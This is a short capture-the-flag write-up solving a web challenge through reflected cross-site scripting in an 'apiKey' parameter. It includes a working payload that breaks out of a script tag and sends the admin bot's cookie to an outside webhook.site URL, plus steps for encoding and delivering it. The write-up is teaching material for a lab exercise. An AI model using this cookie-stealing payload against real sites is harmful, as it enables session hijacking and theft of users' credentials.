## Challenge

> I built a chatgpt website using chatgpt. Feel free to try it! Remember to report to me if you found any bug
>
> **Hint 1:** Try to change the parameter
> **Hint 2:** Try to steal adminâ€™s cookie

The given bot code showed:

* The admin bot visits `http://127.0.0.1/?apiKey=<input>`
* A cookie named `flag` is set on that domain
* Our task is to grab it.

---

## Solution

### Step 1 â€” Intercept the request

Intercept the **Report Admin()** request in Burp Suite and send it to Repeater.
This confirmed the `apiKey` value is exactly what the admin bot loads.

### Step 2 â€” Craft the payload

Get webhook URL first!

Payload (before encoding):

```html
</script><script>
location.href='https://webhook.site/<your-id>?c='+document.cookie
</script>
```

This makes the bot immediately redirect to my webhook with its cookie in the query string.

Encode this payload (URL/hex encoding) using Burpâ€™s built-in encoder:

Encode payload to URL.

### Step 3 â€” Deliver to the admin

Visit the challenge site with the payload as the `apiKey` value, then click **Report Admin**.

The admin bot visits our malicious URL and executes the script.

### Step 4 â€” Get the flag

Back in webhook.site, we see a request like:

```
GET /<your-id>?c=flag=SKR{...}
```

ðŸŽ‰ The flag was successfully stolen.

## Key Takeaways

* The vulnerable sink was the `apiKey` parameter, directly injected into the page.
* Breaking out of the `<script>` context allowed custom JS injection.
* Always encode payloads before injecting into URLs.
* Classic cookie-stealing XSS works perfectly against bot challenges.
